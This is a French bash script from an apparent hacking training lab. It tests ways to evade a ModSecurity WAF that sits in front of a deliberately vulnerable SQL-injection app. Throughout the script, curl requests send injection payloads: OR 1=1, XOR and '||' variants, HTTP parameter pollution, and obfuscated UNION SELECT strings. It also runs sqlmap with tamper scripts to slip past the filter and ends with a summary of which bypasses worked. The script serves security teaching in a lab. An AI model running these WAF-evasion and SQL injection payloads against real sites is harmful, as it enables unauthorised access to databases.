#!/bin/bash
# =====================================================================
# lab_waf_bypass.sh — J3 : Contournement WAF ModSecurity
#   Cible : WAF sur port 8081 (proxy) → sqli-app sur port 8083
#   Techniques : XOR, ||, HPP, encodings, sqlmap tamper
# =====================================================================
set -uo pipefail
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source /tmp/techniques-hacking-mdj/env.sh

WAF_URL="http://${WAF_IP}:${WAF_PORT}"
SQLI_APP_URL="http://${SQLI_APP_IP}"
WAF="${WAF_URL}/?id="

AUTO=0
[ "${1:-}" = "-y" ] && AUTO=1
prompt() { [ "$AUTO" = 1 ] && return 0; echo -e "\n$1"; read -r; }

echo "============================================================"
echo "  J3 - Contournement WAF ModSecurity"
echo "============================================================"
echo "  WAF  : $WAF_URL"
echo "  Backend (direct) : $SQLI_APP_URL"
echo ""

# ------------------------------------------------------------------
# 3.1 — SQLi direct (sans WAF)
# ------------------------------------------------------------------
echo "--- 3.1 — SQLi direct (sans WAF) ---"
echo "[*] Test : injection directe sur sqli-app (port 8083)..."
DIRECT_RES=$(curl -s -o /dev/null -w "%{http_code}" "${SQLI_APP_URL}/?id=1+OR+1=1")
if [ "$DIRECT_RES" = "200" ]; then
  echo "[+] SQli-app accessible directement : HTTP $DIRECT_RES"
else
  echo "[-] SQli-app inaccessible : HTTP $DIRECT_RES"
fi
prompt "Continuer ?"

# ------------------------------------------------------------------
# 3.2 — WAF bloque l'injection standard
# ------------------------------------------------------------------
echo "--- 3.2 — WAF bloque l'injection standard ---"
echo "[*] Test : id=1 OR 1=1 via WAF..."
WAF_RES=$(curl -s -o /dev/null -w "%{http_code}" "${WAF}1+OR+1=1")
if [ "$WAF_RES" = "403" ]; then
  echo "[+] WAF bloque : HTTP $WAF_RES (attendu)"
else
  echo "[-] WAF ne bloque pas : HTTP $WAF_RES"
fi
prompt "Continuer ?"

# ------------------------------------------------------------------
# 3.3 — Bypass XOR (^)
# ------------------------------------------------------------------
echo "--- 3.3 — Bypass XOR (^) ---"
echo "[*] Test : id=1^(1=1)..."
XOR_RES=$(curl -s -o /dev/null -w "%{http_code}" "${WAF}1%5e(1=1)")
XOR_QUERY=$(curl -s "${WAF}1%5e(1=1)" | grep -oP 'Query:.*?</code>' | sed 's/<[^>]*>//g')
if [ "$XOR_RES" = "200" ]; then
  echo "[+] XOR bypass OK : HTTP $XOR_RES"
  echo "    $XOR_QUERY"
else
  echo "[-] XOR echoue : HTTP $XOR_RES"
fi
echo "[*] Test : 1||1 (OR bypass)..."
OR_RES=$(curl -s -o /dev/null -w "%{http_code}" "${WAF}1%7c%7c1")
OR_QUERY=$(curl -s "${WAF}1%7c%7c1" | grep -oP 'Query:.*?</code>' | sed 's/<[^>]*>//g')
if [ "$OR_RES" = "200" ]; then
  echo "[+] || bypass OK : HTTP $OR_RES"
  echo "    $OR_QUERY"
else
  echo "[-] || echoue : HTTP $OR_RES"
fi
echo "[*] Test : HPP (id=1&id=OR+1=1)..."
HPP_RES=$(curl -s -o /dev/null -w "%{http_code}" "${WAF_URL}/?id=1&id=OR+1=1")
HPP_QUERY=$(curl -s "${WAF_URL}/?id=1&id=OR+1=1" | grep -oP 'Query:.*?</code>' | sed 's/<[^>]*>//g')
if [ "$HPP_RES" = "200" ]; then
  echo "[+] HPP bypass OK : HTTP $HPP_RES"
  echo "    $HPP_QUERY"
else
  echo "[-] HPP echoue : HTTP $HPP_RES"
fi
prompt "Continuer ?"

# ------------------------------------------------------------------
# 3.4 — Bypass UNION SELECT
# ------------------------------------------------------------------
echo "--- 3.4 — Tentatives bypass UNION SELECT ---"
for payload in \
  "1+UNION%09SELECT+1,2,3" \
  "1+UNION/**/SELECT+1,2,3" \
  "1+/*!UNION*/+/*!SELECT*/+1,2,3" \
  "1+union+select+1,2,3" \
  "0||(union(select(1),(2),(3)))"; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "${WAF}${payload}")
  echo "  $payload -> HTTP $CODE"
done
echo ""
echo "[*] UNION SELECT bloque par toutes les variantes"
echo "[*] Le CRS OWASP ModSecurity detecte le motif UNION/SELECT"
echo "[*] Bypass possible : fractionnement HTTP, encodage multisocket, etc."
prompt "Continuer ?"

# ------------------------------------------------------------------
# 3.5 — sqlmap avec tamper scripts
# ------------------------------------------------------------------
echo "--- 3.5 — sqlmap avec tamper scripts ---"
echo "[*] Lancement de sqlmap avec tamper=between,randomcase..."
echo "[*] (la BD est hors ligne, sqlmap ne peut pas detecter l'injection)"
echo ""
echo "Commande de reference :"
echo "  sqlmap -u \"${WAF_URL}/?id=1\" --batch --level=2 --risk=2 \\"
echo "    --tamper=between,randomcase,space2comment,space2plus \\"
echo "    --random-agent"
echo ""
sqlmap -u "${WAF_URL}/?id=1" --batch --level=1 --risk=1 \
  --tamper=space2comment --random-agent \
  --flush-session 2>&1 | grep -E "(WAF|injectable|INFO:|CRITICAL)" | head -10
prompt "Terminer ?"

# ------------------------------------------------------------------
echo "============================================================"
echo "  Resume des bypass :"
echo "  [OK] XOR ^       : 1^(1=1)           -> HTTP 200"
echo "  [OK] OR ||       : 1||1              -> HTTP 200"
echo "  [OK] HPP         : id=1&id=OR+1=1    -> HTTP 200"
echo "  [--] UNION SELECT: TOUS bloques      -> HTTP 403"
echo "============================================================"
